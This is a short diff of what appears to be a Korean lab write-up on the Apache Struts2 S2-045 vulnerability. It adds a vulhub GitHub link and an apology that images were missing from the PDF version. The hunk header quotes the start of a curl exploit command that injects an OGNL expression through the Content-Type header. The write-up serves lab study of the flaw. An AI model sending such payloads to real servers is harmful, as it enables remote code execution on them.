@@ -41,3 +41,5 @@ curl -v -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext
 
 ## 7. GitHub 레포 링크
 https://github.com/soonnae/vulhub/tree/master/struts2/s2-045
+
+ * pdf 변환 시 이미지가 보이지 않아서 github에만 넣어놓겠습니다. 죄송합니다.
